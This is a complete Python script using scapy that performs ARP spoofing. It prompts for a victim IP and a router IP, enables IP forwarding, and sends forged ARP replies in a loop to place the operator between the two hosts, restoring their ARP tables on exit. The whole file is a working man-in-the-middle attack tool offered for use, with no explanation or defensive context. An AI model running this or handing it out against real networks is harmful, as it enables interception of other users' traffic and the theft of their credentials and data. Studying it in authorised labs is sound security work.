from scapy.all import *
import sys, os, time

try:
	interface = input("[*] Enter desired interface :")
	victim_ip = input("[*] Enter Victim IP :")
	gate_ip = input("[*] Enter Router IP :")
except KeyboardInterrupt:
	print("\n[*] User requested shutdown")
	print("[*] Exiting....")
	sys.exit(1)

print("[*] Enabling IP forwarding....\n")
os.system("sudo sysctl -w net.inet.ip.forwarding=1")


def getMac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2,
		iface=interface, inter=0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")


def reARP():
	print("[*] Restoring Targets")
	victim_mac = getMac(victim_ip)
	gate_mac = getMac(gate_ip)
	send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, 
		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
	send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, 
		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
	print("[*] Disabling IP forwarding")
	os.system("sudo sysctl -w net.inet.ip.forwarding=0")
	print("[*] Shutting Down....")
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst= vm))
	send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst= gm))


def mitm():
	try:
		victim_mac = getMac(victim_ip)
	except Exception as e:
		print(str(e))
		os.system("sudo sysctl -w net.inet.ip.forwarding=0")
		print("[!] Couldn't find Victim MAC")
		print("[!] Exiting....")
		sys.exit(1)
	try:
		gate_mac = getMac(gate_ip)
	except Exception as e:
		print(str(e))
		os.system("sudo sysctl -w net.inet.ip.forwarding=0")
		print("[!] Couldn't find Router MAC")
		print("[!] Exiting....")
		sys.exit(1)
	print("[*] Poisoning targets.....")
	while 1:
		try:
			trick(gate_mac, victim_mac)
			time.sleep(1)
		except KeyboardInterrupt:
			reARP()
			break

mitm()



